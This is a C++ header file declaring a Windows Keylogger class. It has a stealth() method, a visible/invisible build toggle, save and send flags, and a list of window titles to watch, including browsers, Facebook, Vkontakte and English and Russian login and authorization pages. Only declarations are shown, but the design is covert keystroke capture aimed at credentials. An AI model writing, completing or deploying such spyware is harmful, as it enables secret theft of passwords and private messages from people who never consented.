#pragma once

#include <time.h>
#include <Windows.h>
#include <iostream>


#define visible
//#define invisible

using namespace std;

class Keylogger {
public:
	char popularPages[10][20] = { "Opera","Google Chrome","Mozilla firefox","Yandex","Сообщения","Vkontakte","Facebook","Вход","Authorization","Авторизация" };
	bool canSave = false;
	bool canSend = false;
	FILE* OUTPUT_FILE;
public:
	Keylogger();
	void overrideFile( string fileName);
	void stealth();
	bool checkIfNeedToRemember();
	int Save(int key_stroke, int key_stroke_s);
};